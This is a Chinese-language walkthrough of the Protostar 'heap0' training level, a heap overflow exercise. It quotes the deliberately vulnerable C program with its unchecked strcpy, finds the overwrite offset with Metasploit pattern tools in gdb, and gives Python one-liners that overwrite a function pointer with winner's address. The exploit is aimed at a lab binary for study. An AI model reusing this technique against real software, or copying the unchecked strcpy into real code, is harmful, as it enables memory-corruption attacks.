```
# Heap Zero

This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0
```

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```
---

**题目分析**
```c
- 程序分配了两个相邻的堆块：`d` (类型为 `struct data`，包含一个 64 字节的 `name` 数组) 和 `f` (类型为 `struct fp`，包含一个函数指针 `fp`)。
- 程序将 `f->fp` 初始化为指向 `nowinner` 函数。
- 程序将命令行参数 `argv[1]` 使用 `strcpy` 复制到 `d->name` 中。`strcpy` 不会检查目标缓冲区的长度，这是漏洞所在。
- 最后，程序调用 `f->fp()`，期望输出 "level has not been passed"。
```

**利用思路**
```c
- `strcpy`复制`argv[1]`时，如果参数长度超过64字节，就会溢出`d`的堆块，从而覆盖相邻的`f`堆块的内容。
- 目标是覆盖`f->fp`，使其指向`winner`函数
```

---
**首先确定偏移量为80**

```c
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```c
└─$ gdb heap0
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Successfully imported six module
Reading symbols from heap0...
(gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
Starting program: /opt/protostar/bin/heap0 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
data is at 0x804a1a0, fp is at 0x804a1f0

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```

```c
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136  -l 100
[*] Exact match at offset 80
```

**获取winner 的地址为0x08048464**
```c
└─$ objdump -d ./heap0 |grep winner                                                      
08048464 <winner>:
08048478 <nowinner>:
```

**构造exp**
```c
# python2写法
run $(python2 -c 'print "A"*80 + "\x64\x84\x04\x08"')
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250912195356183.png)

```c
# python3写法
#　python3不可以直接使用ｐｒint函数（默认会在结尾添加一个”\n“）
run $(python -c 'import sys; sys.stdout.buffer.write(b"A"*80 + b"\x64\x84\x04\x08")')
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250912195541212.png)
